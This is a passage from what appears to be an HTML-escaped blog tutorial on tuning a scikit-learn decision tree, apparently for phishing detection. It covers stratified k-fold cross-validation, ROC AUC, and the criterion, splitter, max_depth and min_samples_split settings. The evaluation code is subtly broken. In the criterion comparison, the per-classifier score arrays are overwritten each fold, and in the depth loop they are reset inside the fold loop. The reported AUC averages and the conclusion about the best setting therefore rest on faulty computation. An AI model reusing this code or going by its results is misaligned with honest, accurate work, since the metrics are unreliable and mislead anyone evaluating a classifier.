skf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; StratifiedKFold(n_splits&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, shuffle&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In order to evaluate how good is our classifier, I will use AUC (Area Under Curve), you can find more information about it &lt;a href=&#34;https://www.youtube.com/watch?v=OAl6eAyP-yo&#34;&gt;in this video&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Here is how to create, train and evaluate our first decision tree:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# library for evaluating the classifier&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sklearn.metrics &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; metrics

&lt;span style=&#34;color:#75715e&#34;&gt;# array to store the accuracy during k-fold cross-validation&lt;/span&gt;
accuracy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([])

&lt;span style=&#34;color:#75715e&#34;&gt;# loop with splits&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; train_index, test_index &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; skf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(inputs, outputs):

    &lt;span style=&#34;color:#75715e&#34;&gt;# 9 folds used for training&lt;/span&gt;
    X_train, X_test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; inputs[train_index], inputs[test_index]
    &lt;span style=&#34;color:#75715e&#34;&gt;# 1 fold for testing&lt;/span&gt;
    y_train, y_test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; outputs[train_index], outputs[test_index]

    &lt;span style=&#34;color:#75715e&#34;&gt;# Create a decision tree classifier&lt;/span&gt;
    classifier &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tree&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DecisionTreeClassifier(random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)

    &lt;span style=&#34;color:#75715e&#34;&gt;# Train the classifier&lt;/span&gt;
    classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fit(X_train, y_train)

    &lt;span style=&#34;color:#75715e&#34;&gt;# Test the classifier&lt;/span&gt;
    predictions &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;predict(X_test)
    false_positive_rate, true_positive_rate, thresholds &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; \
        metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;roc_curve(y_test, predictions)

    &lt;span style=&#34;color:#75715e&#34;&gt;# calculate classifier accuracy&lt;/span&gt;
    ROC_AUC &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;auc(false_positive_rate, true_positive_rate)
    accuracy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(accuracy,ROC_AUC)

print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ROC AUC: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;str(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(accuracy)))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&amp;gt; ROC AUC: 0.9182929859719439
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Not bad, but can we improve the accuracy of this decision tree with some tuning?&lt;/p&gt;
&lt;h2 id=&#34;tuning-criterion-and-splitter&#34;&gt;Tuning: criterion and splitter&lt;/h2&gt;
&lt;p&gt;If we take a look at &lt;a href=&#34;https://scikit-learn.org/stable/modules/generated/sklearn.tree.DecisionTreeClassifier.html&#34;&gt;the scikit-learn documentation for the decision tree classifiers&lt;/a&gt;, we can see that there are many parameters available. The first two are the &lt;code&gt;criterion&lt;/code&gt; and &lt;code&gt;splitter&lt;/code&gt;, having both two possible values. The supported criteria are &lt;code&gt;gini&lt;/code&gt; (for &lt;a href=&#34;https://en.wikipedia.org/wiki/Decision_tree_learning#Gini_impurity&#34;&gt;Gini impurity&lt;/a&gt;) and &lt;code&gt;entropy&lt;/code&gt; (for &lt;a href=&#34;https://en.wikipedia.org/wiki/Information_gain_in_decision_trees&#34;&gt;information gain&lt;/a&gt;); while the supported strategies available for splitting a node are &lt;code&gt;best&lt;/code&gt; and &lt;code&gt;random&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;In total, we have 4 possible combinations: let&amp;rsquo;s try them to check which one performs better.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python3&#34; data-lang=&#34;python3&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# AUC scores for test&lt;/span&gt;
results &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []

&lt;span style=&#34;color:#75715e&#34;&gt;# First= gini, best: default classifier&lt;/span&gt;
first_classifier &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tree&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DecisionTreeClassifier(random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; \
    ,criterion&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;gini&amp;#34;&lt;/span&gt;,splitter&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;best&amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# Second= gini, random&lt;/span&gt;
second_classifier &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tree&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DecisionTreeClassifier(random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; \
    ,criterion&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;gini&amp;#34;&lt;/span&gt;,splitter&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;random&amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# Third= entropy, best&lt;/span&gt;
third_classifier &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tree&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DecisionTreeClassifier(random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; \
    ,criterion&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;entropy&amp;#34;&lt;/span&gt;,splitter&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;best&amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# Fourth= entropy, random&lt;/span&gt;
fourth_classifier &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tree&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DecisionTreeClassifier(random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; \
    ,criterion&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;entropy&amp;#34;&lt;/span&gt;,splitter&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;random&amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# use same folds&lt;/span&gt;
StratifiedKFold(n_splits&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, shuffle&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; train_index, test_index &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; skf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(inputs, outputs):

    X_train, X_test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; inputs[train_index], inputs[test_index]
    y_train, y_test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; outputs[train_index], outputs[test_index]

    &lt;span style=&#34;color:#75715e&#34;&gt;# Train and test the first classifier&lt;/span&gt;
    first_classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fit(X_train, y_train)
    predictions &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; first_classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;predict(X_test)
    false_positive_rate, true_positive_rate, thresholds &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; \
		metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;roc_curve(y_test, predictions)
    &lt;span style=&#34;color:#75715e&#34;&gt;# calculate classifier accuracy&lt;/span&gt;
    ROC_AUC &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;auc(false_positive_rate, true_positive_rate)
    first_accuracy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(accuracy,ROC_AUC)

    &lt;span style=&#34;color:#75715e&#34;&gt;# Train and test the second classifier&lt;/span&gt;
    second_classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fit(X_train, y_train)
    predictions &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; second_classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;predict(X_test)
    false_positive_rate, true_positive_rate, thresholds &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; \
		metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;roc_curve(y_test, predictions)
    &lt;span style=&#34;color:#75715e&#34;&gt;# calculate classifier accuracy&lt;/span&gt;
    ROC_AUC &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;auc(false_positive_rate, true_positive_rate)
    second_accuracy&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(accuracy,ROC_AUC)

    &lt;span style=&#34;color:#75715e&#34;&gt;# Train and test the third classifier&lt;/span&gt;
    third_classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fit(X_train, y_train)
    predictions &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; third_classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;predict(X_test)
    false_positive_rate, true_positive_rate, thresholds &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; \
		metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;roc_curve(y_test, predictions)
    &lt;span style=&#34;color:#75715e&#34;&gt;# calculate classifier accuracy&lt;/span&gt;
    ROC_AUC &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;auc(false_positive_rate, true_positive_rate)
    third_accuracy&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(accuracy,ROC_AUC)

    &lt;span style=&#34;color:#75715e&#34;&gt;# Train and test the fourth classifier&lt;/span&gt;
    fourth_classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fit(X_train, y_train)
    predictions &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fourth_classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;predict(X_test)
    false_positive_rate, true_positive_rate, thresholds &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; \
		metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;roc_curve(y_test, predictions)
    &lt;span style=&#34;color:#75715e&#34;&gt;# calculate classifier accuracy&lt;/span&gt;
    ROC_AUC &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;auc(false_positive_rate, true_positive_rate)
    fourth_accuracy&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(accuracy,ROC_AUC)

print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Test AUC for &amp;#39;gini, best&amp;#39;:       &amp;#34;&lt;/span&gt;,np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(first_accuracy))
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Test AUC for &amp;#39;gini, random&amp;#39;:     &amp;#34;&lt;/span&gt;,np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(second_accuracy))
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Test AUC for &amp;#39;entropy, best&amp;#39;:    &amp;#34;&lt;/span&gt;,np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(third_accuracy))
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Test AUC for &amp;#39;entropy, random&amp;#39;:  &amp;#34;&lt;/span&gt;,np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(fourth_accuracy))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&amp;gt; Test AUC for &amp;#39;gini, best&amp;#39;:        0.9186236108580798
&amp;gt; Test AUC for &amp;#39;gini, random&amp;#39;:      0.9185325195846237
&amp;gt; Test AUC for &amp;#39;entropy, best&amp;#39;:     0.9184414283111678
&amp;gt; Test AUC for &amp;#39;entropy, random&amp;#39;:   0.9190781563126251
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In this case, the fourth combination of criterion and splitter (&lt;code&gt;criterion=entropy&lt;/code&gt; and &lt;code&gt;split=random&lt;/code&gt;) seems to increase the performance of the classifier.&lt;/p&gt;
&lt;h2 id=&#34;tuning-max-depth&#34;&gt;Tuning: max depth&lt;/h2&gt;
&lt;p&gt;Another parameter of the decision tree that we can tune is &lt;code&gt;max_depth&lt;/code&gt;, which indicates the maximum depth of the tree. By default, this is is set to &lt;code&gt;None&lt;/code&gt;, which means that nodes are expanded until all leaves are pure or contain less than &lt;code&gt;min_sample_split&lt;/code&gt; samples.&lt;/p&gt;
&lt;p&gt;Considering that we have 10 parameters, we will test the performances of trees having &lt;code&gt;max_depths&lt;/code&gt; between 1 and 10.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# AUC scores for training and test&lt;/span&gt;
training_results &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
test_results &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []

&lt;span style=&#34;color:#75715e&#34;&gt;# use same folds&lt;/span&gt;
StratifiedKFold(n_splits&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, shuffle&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# from 1 to 10&lt;/span&gt;
max_depths &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; max_depths:

    &lt;span style=&#34;color:#75715e&#34;&gt;# loop with splits&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; train_index, test_index &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; skf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(inputs, outputs):
        training_accuracy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([])
        test_accuracy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([])

        X_train, X_test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; inputs[train_index], inputs[test_index]
        y_train, y_test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; outputs[train_index], outputs[test_index]

        &lt;span style=&#34;color:#75715e&#34;&gt;# Create a decision tree classifier&lt;/span&gt;
        classifier &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tree&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DecisionTreeClassifier(random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,max_depth&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;i)

        &lt;span style=&#34;color:#75715e&#34;&gt;# Train the classifier&lt;/span&gt;
        classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fit(X_train, y_train)

        &lt;span style=&#34;color:#75715e&#34;&gt;# Accuracy of the classifier during training&lt;/span&gt;
        training_predictions &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;predict(X_train)
        false_positive_rate, true_positive_rate, thresholds &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; \
            metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;roc_curve(y_train, training_predictions)
        ROC_AUC &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;auc(false_positive_rate, true_positive_rate)
        training_accuracy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(training_accuracy,ROC_AUC)

        &lt;span style=&#34;color:#75715e&#34;&gt;# Test the classifier&lt;/span&gt;
        testing_predictions &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;predict(X_test)
        false_positive_rate, true_positive_rate, thresholds &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; \
            metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;roc_curve(y_test, testing_predictions)

        &lt;span style=&#34;color:#75715e&#34;&gt;# Accuracy of the classifier during test&lt;/span&gt;
        ROC_AUC &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;auc(false_positive_rate, true_positive_rate)
        test_accuracy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(test_accuracy,ROC_AUC)

    &lt;span style=&#34;color:#75715e&#34;&gt;# append results for line chart&lt;/span&gt;
    training_results&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(training_accuracy))
    test_results&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(test_accuracy))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In order to visualize the results, let&amp;rsquo;s use &lt;code&gt;matplotlib&lt;/code&gt; to draw a line chart.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# training results in blue&lt;/span&gt;
line1, &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plot(max_depths, training_results, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;, label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Train AUC&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# test results in red&lt;/span&gt;
line2, &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plot(max_depths, test_results, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;, label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Test AUC&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;legend(handler_map&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{line1: HandlerLine2D(numpoints&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)})
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ylabel(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AUC score&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;xlabel(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Tree depth&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure&gt;&lt;img src=&#34;/images/posts/ml-with-phishing/ep1/maxdepth.png&#34;
         alt=&#34;Performance of the model while tuning max_depth&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;Performance of the model while tuning max_depth&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;As expected, increasing &lt;code&gt;max_depth&lt;/code&gt; allows the model to be more specific when predicting the class of the given sample, thus improving the accuracy during training and test.&lt;/p&gt;
&lt;h2 id=&#34;tuning-min-samples-split&#34;&gt;Tuning: min samples split&lt;/h2&gt;
&lt;p&gt;The next parameter is &lt;code&gt;min_samples_split&lt;/code&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If &lt;code&gt;int&lt;/code&gt;, it represents the minimum number of samples required to split an internal node.&lt;/li&gt;
&lt;li&gt;If &lt;code&gt;float&lt;/code&gt;, it is considered a fraction and &lt;code&gt;ceil(min_samples_split * len(samples))&lt;/code&gt; are the minimum number of samples for each split.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;While the default value is 2, we will test the performance of our classifier having &lt;code&gt;min_samples_split&lt;/code&gt; between 0.05 and 1.0.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# AUC scores for training and test&lt;/span&gt;
training_results &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
test_results &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []

&lt;span style=&#34;color:#75715e&#34;&gt;# use same folds&lt;/span&gt;
StratifiedKFold(n_splits&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, shuffle&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# from 5% to 100%&lt;/span&gt;
min_samples_splits &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;linspace(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.05&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1.0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;,endpoint&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; min_samples_splits:

    &lt;span style=&#34;color:#75715e&#34;&gt;# loop with splits&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; train_index, test_index &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; skf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(inputs, outputs):
        training_accuracy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([])
        test_accuracy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([])
        X_train, X_test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; inputs[train_index], inputs[test_index]
        y_train, y_test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; outputs[train_index], outputs[test_index]

